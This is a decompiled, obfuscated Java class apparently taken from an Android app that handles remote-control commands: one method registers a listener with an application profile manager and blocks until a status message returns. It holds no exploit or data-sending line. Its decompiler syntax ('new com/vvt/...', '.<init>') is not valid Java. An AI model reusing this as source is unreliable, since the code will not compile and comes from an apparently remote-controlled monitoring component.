package com.vvt.appengine.a;

import android.os.ConditionVariable;
import com.vvt.appengine.AppEngine1;
import com.vvt.application_profile_manager.ApplicationProfileManagerImpl;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class bg
{
  private static final boolean b = com.vvt.ak.a.a;
  com.vvt.datadeliverymanager.a.a a;
  private RmtCtrlOutputStatusMessage c;
  private ConditionVariable d;
  
  public bg()
  {
    bh localbh = new com/vvt/appengine/a/bh;
    localbh.<init>(this);
    this.a = localbh;
  }
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.c = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = new android/os/ConditionVariable;
    com.vvt.datadeliverymanager.a.a locala = null;
    ((ConditionVariable)localObject).<init>(false);
    this.d = ((ConditionVariable)localObject);
    boolean bool = b;
    if (bool) {}
    localObject = paramh.M;
    locala = this.a;
    ((ApplicationProfileManagerImpl)localObject).a(locala);
    bool = b;
    if (bool) {}
    this.d.block();
    return this.c;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bg.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */